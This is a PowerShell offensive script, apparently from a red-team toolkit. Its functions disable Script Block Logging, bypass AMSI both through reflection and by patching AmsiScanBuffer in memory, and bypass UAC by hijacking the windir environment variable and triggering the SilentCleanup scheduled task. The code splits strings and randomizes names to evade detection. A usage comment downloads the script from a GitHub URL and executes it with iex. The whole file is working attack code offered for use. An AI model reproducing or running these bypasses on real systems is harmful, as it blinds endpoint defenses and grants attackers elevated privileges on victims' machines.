$id = random

iex @"
function Invoke-Bypass-$id-ScriptBlockLog {
    # cobbr's Script Block Logging bypass
    `$GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','N'+'onPublic,Static');
    If(`$GPF){
        `$GPC=`$GPF.GetValue(`$null);
        If(`$GPC['ScriptB'+'lockLogging']){
            `$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
            `$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockInvocationLogging']=0
        }
        `$val=[Collections.Generic.Dictionary[string,System.Object]]::new();
        `$val.Add('EnableScriptB'+'lockLogging',0);
        `$val.Add('EnableScriptB'+'lockInvocationLogging',0);
        `$GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=`$val
    } Else {
        [ScriptBlock].GetField('signatures','N'+'onPublic,Static').SetValue(`$null,(New-Object Collections.Generic.HashSet[string]))
    }
}
"@;

iex @"
function Invoke-Bypass-$id-AMSI {
    # @mattifestation's AMSI bypass
    `$Ref=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils');
    `$Ref.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue(`$null,`$true);
}
"@;

iex @"
function Invoke-Bypass-$id-AMSI2 {
    # rastamouse's AMSI bypass (Add-Type writes *.cs on disk!!)
    `$Ref = (
    "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
    );

    `$Source = @"
using System;
using System.Runtime.InteropServices;

namespace Bypass$id
{
    public class AMSI$id
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static int Disable()
        {
            string hexbuffer = "41 6d 73 69 53 63 61 6e 42 75 66 66 65 72";
            string buffer="";
            string[] hexbuffersplit = hexbuffer.Split(' ');
            foreach (String hex in hexbuffersplit)
            {
                int value = Convert.ToInt32(hex, 16);
                buffer+= Char.ConvertFromUtf32(value);
            }
            IntPtr Address = GetProcAddress(LoadLibrary("a"+ "msi"+ ".dl" +"l"), buffer);
            UIntPtr size = (UIntPtr)5;
            uint p = 0;
            VirtualProtect(Address, size, 0x40, out p);
            byte c1=0xB8,c2=0x80;
            Byte[] Patch = {c1, 0x57, 0x00, 0x07, c2, 0xC3 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
            Marshal.Copy(Patch, 0, unmanagedPointer, 6);
            MoveMemory(Address, unmanagedPointer, 6);

            return 0;
        }
    }
}
`"@;

    Add-Type -ReferencedAssemblies `$Ref -TypeDefinition `$Source -Language CSharp;
    iex "[Bypass$id.AMSI$id]::Disable() | Out-Null"
}
"@;

iex @"
function Invoke-Bypass-$id-UACSilentCleanup {
    # (Add-Type writes *.cs on disk!!)
    # https://tyranidslair.blogspot.com/2017/05/exploiting-environment-variables-in.html

    Param(
        [Parameter(Mandatory=`$True,HelpMessage="Enter command to execute.")]
        `$Command
    )

    `$Source = @"
using System;
using Microsoft.Win32;
using System.Diagnostics;

namespace UACBypass
{
    public class SilentCleanup$id
    {
        public static void exec(string payload)
        {
            // Payload to be executed
            Console.WriteLine("[+] Starting Bypass UAC.");

            try
            {
                // Registry Key Modification
                RegistryKey key;
                key = Registry.CurrentUser.CreateSubKey(@"Environment");
                key.SetValue("windir", "cmd.exe /c " + payload + " & ", RegistryValueKind.String);
                key.Close();

                Console.WriteLine("[+] Enviroment Variabled %windir% Created.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to Create the Enviroment Variabled %windir%.");
                Console.WriteLine("[-] Exit.");
            }

            //Wait 5 sec before execution
            Console.WriteLine("[+] Waiting 5 seconds before execution.");
            System.Threading.Thread.Sleep(5000);

            // Trigger the UAC Bypass 
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.CreateNoWindow = true;
                startInfo.UseShellExecute = false;
                startInfo.FileName = "schtasks.exe";
                startInfo.Arguments = @"/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I";
                Process.Start(startInfo);

                Console.WriteLine("[+] UAC Bypass Application Executed.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to Execute the Application schtasks.exe to perform the bypass.");
            }

            //Clean Registry
            DeleteKey();

            Console.WriteLine("[-] Exit.");
        }

        static void DeleteKey()
        {
            //Wait 5 sec before cleaning
            Console.WriteLine("[+] Registry Cleaning will start in 5 seconds.");
            System.Threading.Thread.Sleep(5000);

            try
            {
                var rkey = Registry.CurrentUser.OpenSubKey(@"Environment", true);

                // Validate if the Key Exist
                if (rkey != null)
                {
                    try
                    {
                        rkey.DeleteValue("windir");
                        rkey.Close();
                    }
                    catch (Exception err)
                    {
                        Console.WriteLine(@"[-] Unable to Delete the Registry key (Environment). Error " + err.Message);
                    }
                }

                Console.WriteLine("[+] Registry Cleaned.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to Clean the Registry.");
            }
        }
    }
}
`"@;

    Add-Type -TypeDefinition `$Source -Language CSharp;
    iex "[UACBypass.SilentCleanup$id]::exec(```$Command) | Out-Null"
}
"@;

# Usage
# $browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials; iex($browser.downloadstring("https://raw.githubusercontent.com/d0nkeys/redteam/master/code-execution/Invoke"+"-"+"Bypass.ps1"));
# iex "$(Get-Command 'Invoke-Bypass-*-AMSI')"
# iex "$(Get-Command 'Invoke-Bypass-*-AMSI2')"
# iex "$(Get-Command 'Invoke-Bypass-*-ScriptBlockLog')"
# iex "$(Get-Command 'Invoke-Bypass-*-UACSilentCleanup') -Command cmd.exe"
